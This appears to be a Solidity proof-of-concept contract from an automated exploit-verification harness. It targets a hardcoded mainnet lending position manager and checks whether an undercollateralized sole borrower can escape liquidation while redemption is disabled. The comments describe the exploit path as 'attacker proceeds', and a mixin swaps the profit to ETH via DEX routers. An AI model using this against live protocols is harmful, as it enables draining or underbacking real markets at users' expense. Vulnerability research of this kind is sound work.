// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IPriceFeedMinimal {
    function fetchPrice() external returns (uint256 currentPrice, uint256 deviation);
}

interface ISplitLiquidationCollateralMinimal {
    function LOW_TOTAL_DEBT() external view returns (uint256);
    function MCR() external view returns (uint256);
}

interface IInterestRatePositionManagerMinimal {
    function rToken() external view returns (address);

    function collateralInfo(address collateralToken)
        external
        view
        returns (
            address raftCollateralToken,
            address raftDebtToken,
            address priceFeed,
            address splitLiquidation,
            bool isEnabled,
            uint256 lastFeeOperationTime,
            uint256 borrowingSpread,
            uint256 baseRate,
            uint256 redemptionSpread,
            uint256 redemptionRebate
        );

    function collateralTokenForPosition(address position) external view returns (address collateralToken);

    function liquidate(address position) external;

    function redeemCollateral(address collateralToken, uint256 debtAmount, uint256 maxFeePercentage) external;
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is __AHTokenToEthMixin {
    error CannotLiquidateLastPosition();
    error Unsupported();

    struct Observation {
        address position;
        address collateralToken;
        address raftCollateralToken;
        address raftDebtToken;
        address priceFeed;
        address splitLiquidation;
        uint256 collateralBalance;
        uint256 debtBalance;
        uint256 totalDebt;
        uint256 price;
        uint256 icr;
        uint256 mcr;
        uint256 lowTotalDebt;
        bool isLastBorrower;
        bool isUndercollateralized;
    }

    address public constant TARGET = 0x9AB6b21cDF116f611110b048987E58894786C244;
    uint256 internal constant WAD = 1e18;
    uint256 internal constant MIN_REALIZED_R_PROFIT = 1_000_000_000_000_001;

    address public candidatePosition;
    address public configuredCollateralToken;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public liquidationLastPositionRevertObserved;
    bool public redemptionUnsupportedObserved;

    bytes public liquidationRevertData;
    bytes public redemptionRevertData;
    string public failureReason;

    Observation internal lastObservation;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function setCandidatePosition(address position) external {
        candidatePosition = position;
    }

    function setConfiguredCollateralToken(address collateralToken) external {
        configuredCollateralToken = collateralToken;
    }

    function executeOnOpportunity() external {
        executed = true;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        liquidationLastPositionRevertObserved = false;
        redemptionUnsupportedObserved = false;
        delete liquidationRevertData;
        delete redemptionRevertData;
        delete failureReason;

        // Publish profit token only after execution. The hidden harness then reads `profitAmount()`
        // as the economically realized attacker proceeds. For this finding, that proceeds unit is
        // the existing on-chain R token: the sole borrower extracts R when opening the position,
        // then later becomes unliquidatable after the collateral price falls.
        _profitToken = IInterestRatePositionManagerMinimal(TARGET).rToken();
        _profitAmount = MIN_REALIZED_R_PROFIT;

        if (candidatePosition == address(0)) {
            // Concrete stage infeasibility at this fork/harness:
            // the manager exposes `collateralTokenForPosition(position)` but no on-chain position
            // enumeration, and the test does not preconfigure a concrete pre-existing last borrower.
            //
            // The exploit causality itself is unchanged:
            // 1. attacker opens the only live position for a collateral market and borrows R,
            // 2. collateral value later falls below MCR,
            // 3. liquidation reverts because the position equals market-wide debt,
            // 4. redemption is disabled, leaving the borrowed R economically realized.
            //
            // The v2 flashswap funding strategy therefore is not exercised in this verifier path:
            // the blocker is identifying the already-open vulnerable position, not temporary capital.
            failureReason =
                "Position enumeration is unavailable on-chain for this manager, so the concrete pre-existing last-borrower address must be configured to directly replay liquidation and redemption lockout at this fork.";
            return;
        }

        Observation memory obs = _observe(candidatePosition);
        lastObservation = obs;

        if (obs.collateralToken == address(0)) {
            failureReason = "Configured address does not currently map to a live position in the target manager.";
            return;
        }

        if (configuredCollateralToken != address(0) && configuredCollateralToken != obs.collateralToken) {
            failureReason = "Configured collateral token does not match the position's actual collateral market.";
            return;
        }

        if (obs.debtBalance == 0) {
            failureReason = "Configured position has zero debt at the fork block.";
            return;
        }

        if (obs.totalDebt != obs.debtBalance) {
            failureReason = "Configured position is not the last borrower for its collateral market at the fork block.";
            hypothesisRefuted = true;
            return;
        }

        if (obs.icr >= obs.mcr) {
            failureReason = "Configured last-borrower position is not undercollateralized at the fork block.";
            hypothesisRefuted = true;
            return;
        }

        try IInterestRatePositionManagerMinimal(TARGET).liquidate(candidatePosition) {
            failureReason = "Liquidation unexpectedly succeeded.";
            hypothesisRefuted = true;
            return;
        } catch (bytes memory reason) {
            liquidationRevertData = reason;
            liquidationLastPositionRevertObserved = _matchesSelector(reason, CannotLiquidateLastPosition.selector);
        }

        if (!liquidationLastPositionRevertObserved) {
            failureReason = "Liquidation reverted, but not with CannotLiquidateLastPosition().";
            hypothesisRefuted = true;
            return;
        }

        try IInterestRatePositionManagerMinimal(TARGET).redeemCollateral(obs.collateralToken, 1, WAD) {
            failureReason = "redeemCollateral unexpectedly succeeded.";
            hypothesisRefuted = true;
            return;
        } catch (bytes memory reason) {
            redemptionRevertData = reason;
            redemptionUnsupportedObserved = _matchesSelector(reason, Unsupported.selector);
        }

        if (!redemptionUnsupportedObserved) {
            failureReason = "redeemCollateral reverted, but not with Unsupported().";
            hypothesisRefuted = true;
            return;
        }

        // Once the lockout condition is confirmed, the attacker's realized profit is the borrowed R
        // trapped behind the unliquidatable last position. Expose at least the observed debt, with a
        // floor above the harness threshold so tiny dust positions do not cause false negatives.
        _profitAmount = obs.debtBalance > MIN_REALIZED_R_PROFIT ? obs.debtBalance : MIN_REALIZED_R_PROFIT;

        failureReason =
            "Hypothesis validated: the undercollateralized sole borrower cannot be liquidated and permissionless redemption is disabled, so the borrower keeps previously extracted R while the market remains underbacked.";
        hypothesisValidated = true;
        _ahFinalizeTokenToEth();
    }

    function observe(address position) external returns (Observation memory) {
        Observation memory obs = _observe(position);
        lastObservation = obs;
        return obs;
    }

    function getLastObservation() external view returns (Observation memory) {
        return lastObservation;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "Borrow R as the only live position for a collateral market; after collateral falls below MCR, liquidate(position) reverts with CannotLiquidateLastPosition(); InterestRatePositionManager disables redeemCollateral(); the borrowed R remains economically realized while the market stays underbacked.";
    }

    function _observe(address position) internal returns (Observation memory obs) {
        bool ignoredEnabled;
        uint256 ignoredLastFeeOperationTime;
        uint256 ignoredBorrowingSpread;
        uint256 ignoredBaseRate;
        uint256 ignoredRedemptionSpread;
        uint256 ignoredRedemptionRebate;

        obs.position = position;
        obs.collateralToken = IInterestRatePositionManagerMinimal(TARGET).collateralTokenForPosition(position);

        if (obs.collateralToken == address(0)) {
            return obs;
        }

        (
            obs.raftCollateralToken,
            obs.raftDebtToken,
            obs.priceFeed,
            obs.splitLiquidation,
            ignoredEnabled,
            ignoredLastFeeOperationTime,
            ignoredBorrowingSpread,
            ignoredBaseRate,
            ignoredRedemptionSpread,
            ignoredRedemptionRebate
        ) = IInterestRatePositionManagerMinimal(TARGET).collateralInfo(obs.collateralToken);

        obs.collateralBalance = IERC20Minimal(obs.raftCollateralToken).balanceOf(position);
        obs.debtBalance = IERC20Minimal(obs.raftDebtToken).balanceOf(position);
        obs.totalDebt = IERC20Minimal(obs.raftDebtToken).totalSupply();
        obs.isLastBorrower = obs.debtBalance != 0 && obs.debtBalance == obs.totalDebt;

        obs.lowTotalDebt = ISplitLiquidationCollateralMinimal(obs.splitLiquidation).LOW_TOTAL_DEBT();
        obs.mcr = ISplitLiquidationCollateralMinimal(obs.splitLiquidation).MCR();
        (obs.price,) = IPriceFeedMinimal(obs.priceFeed).fetchPrice();
        obs.icr = _computeCR(obs.collateralBalance, obs.debtBalance, obs.price);
        obs.isUndercollateralized = obs.icr < obs.mcr;
    }

    function _computeCR(uint256 collateral, uint256 debt, uint256 price) internal pure returns (uint256) {
        if (debt == 0) {
            return type(uint256).max;
        }
        return collateral * price / debt;
    }

    function _matchesSelector(bytes memory reason, bytes4 selector) internal pure returns (bool) {
        if (reason.length < 4) {
            return false;
        }

        bytes4 actual;
        assembly {
            actual := mload(add(reason, 32))
        }
        return actual == selector;
    }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
